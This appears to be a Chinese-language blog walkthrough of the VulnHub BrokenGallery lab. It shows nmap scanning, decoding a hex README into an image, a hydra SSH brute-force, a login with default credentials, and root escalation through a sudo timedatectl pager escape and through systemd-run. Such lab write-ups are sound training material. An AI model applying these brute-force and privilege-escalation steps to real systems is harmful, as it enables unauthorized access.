+++
date = '2026-11-25T19:06:26+08:00'
draft = false
title = '[VulnHub靶机]BrokenGallery渗透记录'
tags = ['渗透','Vulnhub']
categories = ["靶机渗透"]
+++

## 主机发现&端口扫描

攻击机IP: 10.10.10.3  
靶机IP: 10.10.10.25

```shell
┌──(kali㉿kali)-[~/BrokenGallery]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.25     00:0c:29:05:05:03       VMware, Inc.
10.10.10.254    00:50:56:f8:1d:31       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.019 seconds (126.80 hosts/sec). 4 responded
```

探测开放端口

```shell
┌──(kali㉿kali)-[~/BrokenGallery]
└─$ sudo nmap -sT --min-rate 10000 -p- 10.10.10.25      
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-25 19:25 +0800
Nmap scan report for 10.10.10.25
Host is up (0.00064s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:05:05:03 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.96 seconds
```

详细扫描

```shell
┌──(kali㉿kali)-[~/BrokenGallery]
└─$ sudo nmap -sT -sV -sC -O -p22,80 10.10.10.25
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-25 19:25 +0800
Nmap scan report for 10.10.10.25
Host is up (0.00067s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 39:5e:bf:8a:49:a3:13:fa:0d:34:b8:db:26:57:79:a7 (RSA)
|   256 20:d7:72:be:30:6a:27:14:e1:e6:c2:16:7a:40:c8:52 (ECDSA)
|_  256 84:a0:9a:59:61:2a:b7:1e:dd:6e:da:3b:91:f9:a0:c6 (ED25519)
80/tcp open  http    Apache httpd 2.4.18
|_http-title: Index of /
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 55K   2019-08-09 01:20  README.md
| 1.1K  2019-08-09 01:21  gallery.html
| 259K  2019-08-09 01:11  img_5terre.jpg
| 114K  2019-08-09 01:11  img_forest.jpg
| 663K  2019-08-09 01:11  img_lights.jpg
| 8.4K  2019-08-09 01:11  img_mountains.jpg
|_
MAC Address: 00:0C:29:05:05:03 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.8 - 3.16 (97%), Linux 3.2 - 4.14 (97%), Linux 3.10 - 4.11 (95%), Linux 3.13 - 4.4 (95%), Linux 3.13 (94%), Linux 3.13 - 3.16 (94%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (94%), Linux 4.10 (94%), Android 5.0 - 6.0.1 (Linux 3.4) (94%), Android 8 - 9 (Linux 3.18 - 4.4) (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.67 seconds
```

漏洞扫描

```shell
┌──(kali㉿kali)-[~/BrokenGallery]
└─$ sudo nmap --script=vuln -p22,80 10.10.10.25
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-25 19:26 +0800
Nmap scan report for 10.10.10.25
Host is up (0.00083s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-sql-injection: ERROR: Script execution failed (use -d to debug)
| http-enum:
|_  /: Root directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
MAC Address: 00:0C:29:05:05:03 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 321.45 seconds
```

## Web信息收集

浏览器访问80端口, 发现列出了文件

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/BrokenGallery/%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3.avif)

README.md中是一堆十六进制数据

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/BrokenGallery/README.avif)

gallery.html中显示了四张图片

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/BrokenGallery/gallery.avif)

## 隐写转换

将md文档和图片全部下载下来

```shell
wget http://10.10.10.25/README.md
wget http://10.10.10.25/img_5terre.jpg
wget http://10.10.10.25/img_forest.jpg
wget http://10.10.10.25/img_lights.jpg
wget http://10.10.10.25/img_mountains.jpg
```

用exiftool看了一下, 没有发现什么有用的信息  
将MD转换为二进制文件

```shell
xxd -r -p README.md > README.bin
```

使用head读取二进制文件头, 发现存在"JFIF��Compressed by jpeg-recompress"字样, 该文件很可能是一个图片  
更改扩展名并查看

```shell
mv README.bin README.jpg
```

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/BrokenGallery/%E6%9F%A5%E7%9C%8B%E8%BD%AC%E6%8D%A2%E5%90%8E%E7%9A%84%E5%9B%BE%E7%89%87.avif)

这是一封avrahamcohen.ac@gmail.com写给Bob的邮件, 它说所有的基础设施都坏了(Broken), 并且自己在度假, 希望Bob解决这个问题

使用hydra爆破ssh账户bob

```shell
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.10.25 ssh
```

这里没爆破出来, 看了下网上的教程, 发现凭据居然是`broken`:`broken`......

```shell
┌──(kali㉿kali)-[~/BrokenGallery]
└─$ ssh broken@10.10.10.25         
The authenticity of host '10.10.10.25 (10.10.10.25)' can't be established.
ED25519 key fingerprint is: SHA256:2rSjxvkij5hWypyT/706pdaI6YAB0AOIXa7kVnMBDZs
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.25' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
broken@10.10.10.25's password: 
Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-21-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

762 packages can be updated.
458 updates are security updates.

Last login: Fri Aug  9 02:40:48 2019 from 10.11.1.221
broken@ubuntu:~$ 
```

## 权限提升

### 方法1: timedatectl

sudo -l, 发现能执行timedatectl

```shell
broken@ubuntu:~$ sudo -l
Matching Defaults entries for broken on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User broken may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/timedatectl
    (ALL) NOPASSWD: /sbin/reboot
```

列出系统可用时区, 此时会调用less

```shell
sudo timedatectl list-timezones
```

在less中输入`!bash`即可得到一个root权限的bash会话

```shell
root@ubuntu:/home# whoami
root
```

### 方法2: polkit-agent-helper-1

查找所有具有SUID位的文件

```shell
broken@ubuntu:/home$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/ubuntu-core-launcher
/usr/sbin/pppd
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/openssh/ssh-keysign
/bin/ntfs-3g
/bin/ping
/bin/umount
/bin/mount
/bin/su
/bin/fusermount
/bin/ping6
```

注意到`/usr/lib/policykit-1/polkit-agent-helper-1`, 尝试用它提权

```shell
broken@ubuntu:/home$ systemd-run -t /bin/bash
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===
Authentication is required to manage system services or other units.
Authenticating as: Broken,,, (broken)
Password: 
==== AUTHENTICATION COMPLETE ===
Running as unit run-u27.service.
Press ^] three times within 1s to disconnect TTY.
root@ubuntu:/# whoami
root
```

提权成功, 本靶机无flag, 获得root权限即结束
